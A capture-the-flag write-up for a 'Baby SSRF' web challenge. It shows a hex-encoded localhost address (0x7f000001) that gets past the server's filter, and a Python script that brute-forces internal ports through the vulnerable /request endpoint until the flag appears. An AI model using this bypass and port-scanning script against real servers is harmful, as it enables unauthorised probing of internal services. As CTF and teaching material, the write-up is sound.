# Baby SSRF
Bypassing SSRF restrictions allowed scanning the ports and finding the flag.

## Enumeration
Visiting the page we find `/request` endpoint, which allows us to request website's response headers.

Challenge name includes [Server Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf), so I tried to fetch localhost data. When requesting localhost headers, the server responded with: `Please dont try to heck me sir...`. I guessed there must be some kind of restriction which addresses are allowed.

I googled how to bypass localhost restrictions and found [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery). I tried those payloads one by one until `http://0x7f000001/` responded with `Learn about URL's First`. That worked somehow, but website didn't show any response headers.

## Solve

Challenge description gave us a hint `for i in range(5000,10000)`

Using that hint, I realized bruteforcing the port is the goal.

I created a small script using python

```python
from requests import post

res = set()
res.add(post("http://web.zh3r0.cf:1111/request", data={"url": f"http://0x7F000001:5001"}).text)
for port in range(5000,10000):
    r = post("http://web.zh3r0.cf:1111/request", data={"url": f"http://0x7F000001:{port}"})
    print(f"[+] Trying on http://0x7F000001:{port}")
    if r.text not in res:
        res.add(r.text)
        print(r.text)
        break
```

Script stopped at port 9006

Response included the flag:

### Flag
```
{'FLag': 'Zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}'}
```
